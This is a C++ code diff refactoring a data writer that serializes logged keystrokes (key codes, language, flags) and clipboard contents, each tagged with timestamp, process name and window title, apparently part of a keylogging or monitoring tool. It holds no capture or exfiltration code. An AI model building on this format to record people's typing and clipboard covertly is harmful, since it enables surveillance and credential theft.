@@ -12,7 +12,7 @@ namespace LRCData
 
 		for (size_t i = sizeof(T); i > 0; --i)
 		{
-			bvResult.push_back(static_cast<byte>(data >> ((i - 1) * 8)));
+			bvResult.push_back(static_cast<uint8_t>(data >> ((i - 1) * 8)));
 		}
 
 		return bvResult;
@@ -46,59 +46,56 @@ namespace LRCData
 		header.type = 0x0;
 	}
 
-	ByteVector LRCDataWriter::GetBytes(std::list<PartKeyboard> data)
+
+	ByteVector LRCDataWriter::GetBytes(std::vector<Keyboard> data)
 	{
-		ByteVector dataBlock(getBytes(data.size()));
+		binpp::BinaryWriter writer;
 
-		for (std::list<PartKeyboard>::iterator it = data.begin(); it != data.end(); ++it)
+		// data.count
+		writer.Append<uint32_t>(data.size());
+
+		for each (Keyboard kbd in data)
 		{
-			ByteVector bvResult;
+			// data.items[n].wndInfo
+			writer.Append<uint32_t>(kbd.wndInfo.time);
+			writer.AppendBytes(getStrBytes(kbd.wndInfo.process));
+			writer.AppendBytes(getStrBytes(kbd.wndInfo.title));
 
-			// Subtype of part
-			bvResult.push_back(it->subtype);
+			// data.items[n].count
+			writer.Append<uint32_t>(kbd.keys.size());
 
-			if (it->subtype == 0x1)
+			// for each 'vkInfo' in data.items[n].keys[count]
+			for each (VKInfo vkInfo in kbd.keys)
 			{
-				ByteVector bvKeyCode = getBytes(it->vkInfo.keyCode);
-				ByteVector bvLang = getBytes(it->vkInfo.lang);
-				ByteVector bvFlags = getBytes(it->vkInfo.flags);
-
-				std::copy(bvKeyCode.begin(), bvKeyCode.end(), std::back_inserter(bvResult));
-				std::copy(bvLang.begin(), bvLang.end(), std::back_inserter(bvResult));
-				std::copy(bvFlags.begin(), bvFlags.end(), std::back_inserter(bvResult));
+				// data.items[n].keys[n]
+				writer.Append<uint32_t>(vkInfo.keyCode);
+				writer.Append<uint16_t>(vkInfo.lang);
+				writer.Append<uint8_t>(vkInfo.flags);
 			}
-			else if (it->subtype == 0x2)
-			{
-				ByteVector bvTime = getBytes(it->wndInfo.time);
-				ByteVector bvProcessName = getStrBytes(it->wndInfo.processName);
-				ByteVector bvTitle = getStrBytes(it->wndInfo.title);
-
-				std::copy(bvTime.begin(), bvTime.end(), std::back_inserter(bvResult));
-				std::copy(bvProcessName.begin(), bvProcessName.end(), std::back_inserter(bvResult));
-				std::copy(bvTitle.begin(), bvTitle.end(), std::back_inserter(bvResult));
-			}
-
-			std::copy(bvResult.begin(), bvResult.end(), std::back_inserter(dataBlock));
 		}
 
+		ByteVector bvData = writer.GetData();
+
 		header.type = 0x01;
-		header.length = dataBlock.size();
+		header.length = bvData.size();
 
 		ByteVector bvResult = getHeaderBytes();
-		std::copy(dataBlock.begin(), dataBlock.end(), std::back_inserter(bvResult));
+
+		std::copy(bvData.begin(), bvData.end(), std::back_inserter(bvResult));
+
 		return bvResult;
 	}
 
-	ByteVector LRCDataWriter::GetBytes(std::list<PartClipboard> data)
+	ByteVector LRCDataWriter::GetBytes(std::vector<Clipboard> data)
 	{
 		ByteVector dataBlock(getBytes(data.size()));
 
-		for (std::list<PartClipboard>::iterator it = data.begin(); it != data.end(); ++it)
+		for (std::vector<Clipboard>::iterator it = data.begin(); it != data.end(); ++it)
 		{
 			ByteVector bvResult;
 
 			ByteVector bvTime = getBytes(it->wndInfo.time);
-			ByteVector btProcessName = getStrBytes(it->wndInfo.processName);
+			ByteVector btProcessName = getStrBytes(it->wndInfo.process);
 			ByteVector bvTitle = getStrBytes(it->wndInfo.title);
 			ByteVector bvData = getStrBytes(it->data);
 
@@ -118,7 +115,7 @@ namespace LRCData
 		return bvResult;
 	}
 
-	bool LRCDataWriter::WriteData(std::string filename, std::list<PartKeyboard> data)
+	bool LRCDataWriter::WriteData(std::string filename, std::vector<Keyboard> data)
 	{
 		ByteVector bvData = GetBytes(data);
 
@@ -128,7 +125,7 @@ namespace LRCData
 		return writer.Save(filename);
 	}
 
-	bool LRCDataWriter::WriteData(std::string filename, std::list<PartClipboard> data)
+	bool LRCDataWriter::WriteData(std::string filename, std::vector<Clipboard> data)
 	{
 		ByteVector bvData = GetBytes(data);
 
@@ -146,12 +143,7 @@ namespace LRCData
 		writer.Append(header.id, 64);
 		writer.Append(header.type);
 		writer.Append(header.length);
-		size_t headerLength = writer.Size();
-		byte *rawBytes = new byte[headerLength];
-		writer.GetBytes(rawBytes, headerLength);
-		ByteVector result;
-		std::copy(&rawBytes[0], &rawBytes[headerLength], std::back_inserter(result));
-		return result;
+		return writer.GetData();
 	}
 
 	void LRCDataWriter::initHeader()
